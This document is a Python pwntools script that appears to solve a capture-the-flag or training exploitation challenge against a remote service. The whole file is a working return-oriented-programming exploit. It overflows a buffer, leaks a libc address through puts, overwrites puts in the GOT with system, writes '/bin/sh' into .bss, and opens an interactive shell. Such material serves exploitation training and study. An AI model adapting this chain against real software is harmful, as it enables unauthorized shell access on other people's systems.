
from pwn import *
context.terminal=['tmux', 'splitw', '-h']

#p = process("./prob2")
p = remote("fsi.zzado.kr", 9934)
e = ELF("./03 Pwn/prob4")
libc = ELF('./03 Pwn/prob4_libc.so.6')
puts_plt = e.plt['puts']
puts_got = e.got['puts']
read_plt = e.plt['read']
bss = e.bss() + 0x20

r = ROP(e)
pop_1 = r.find_gadget(['pop edi', 'ret'])[0]
pop_3 = r.find_gadget(['pop ebx', 'pop esi', 'pop edi', 'ret'])[0]

#gdb.attach(p,'b* vulns')
print(p.recv())
input(">")


payload =  b'a' * 0x20
payload += b'b' * 0x4      # SFP
payload += p32(puts_plt)
payload += p32(pop_1)
payload += p32(puts_got)

# read(0, puts@got, 0x14)
payload += p32(read_plt)
payload += p32(pop_3)
payload += p32(0x00)
payload += p32(puts_got)
payload += p32(0x4)

#read(0, .bss, 0x10)
payload += p32(read_plt)
payload += p32(pop_3)
payload += p32(0x00)
payload += p32(bss)
payload += p32(0x10)

#system(bss)
payload += p32(puts_plt)
payload += b'c' * 4
payload += p32(bss)

p.send(payload)

##leak libc
p.recvuntil(b'\n')
leak_data = u32(p.recv()[:4])
libc_base = leak_data - libc.symbols['puts']
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

log.info(f'libc_base : {hex(libc_base)}')
log.info(f'puts addr :: {hex(leak_data)}')
log.info(f'system : {hex(system)}')

p.send(p32(system))
p.send(b'/bin/sh\x00')

p.interactive() 
